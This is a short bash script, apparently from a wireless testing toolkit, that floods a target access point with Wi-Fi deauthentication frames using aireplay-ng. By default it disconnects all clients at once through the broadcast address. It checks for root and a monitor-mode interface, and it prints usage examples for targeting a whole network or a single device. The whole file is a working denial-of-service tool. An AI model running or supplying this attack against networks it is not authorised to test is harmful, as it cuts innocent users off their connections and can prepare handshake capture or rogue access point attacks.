#!/bin/bash
# Deauth Flood - Sends deauthentication frames to disconnect clients
# Usage: sudo ./scripts/deauth-flood.sh <interface> <bssid> [client_mac] [count]
#
# Examples:
#   sudo ./scripts/deauth-flood.sh wlan0mon AA:BB:CC:DD:EE:FF              # All clients
#   sudo ./scripts/deauth-flood.sh wlan0mon AA:BB:CC:DD:EE:FF 11:22:33:44:55:66  # Specific client
#
# Requires: Monitor mode interface

set -e

IFACE="${1:?Usage: $0 <interface> <bssid> [client_mac] [count]}"
BSSID="${2:?Usage: $0 <interface> <bssid> [client_mac] [count]}"
CLIENT="${3:-FF:FF:FF:FF:FF:FF}"
COUNT="${4:-100}"

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

echo -e "${GREEN}╔══════════════════════════════════════╗${NC}"
echo -e "${GREEN}║       Deauth Flood - RTL8188FU       ║${NC}"
echo -e "${GREEN}╚══════════════════════════════════════╝${NC}"
echo ""

# Check root
if [[ $EUID -ne 0 ]]; then
    echo -e "${RED}[-] Must run as root (sudo)${NC}"
    exit 1
fi

# Check if interface is in monitor mode
IFACE_TYPE=$(iw dev "$IFACE" info 2>/dev/null | grep "type" | awk '{print $2}')
if [[ "$IFACE_TYPE" != "monitor" ]]; then
    echo -e "${RED}[-] $IFACE is not in monitor mode (current: $IFACE_TYPE)${NC}"
    echo -e "${YELLOW}[*] Enable monitor mode: sudo airmon-ng start $IFACE${NC}"
    exit 1
fi

echo -e "${YELLOW}[*] Interface: $IFACE (monitor mode)${NC}"
echo -e "${YELLOW}[*] Target BSSID: $BSSID${NC}"
echo -e "${YELLOW}[*] Client: $CLIENT${NC}"
echo -e "${YELLOW}[*] Count: $COUNT frames${NC}"
echo ""

# Send deauth using aireplay-ng
echo -e "${YELLOW}[*] Sending deauth frames...${NC}"
aireplay-ng -0 "$COUNT" -a "$BSSID" -c "$CLIENT" "$IFACE"

echo ""
echo -e "${GREEN}[+] Deauth complete! Sent $COUNT frames${NC}"
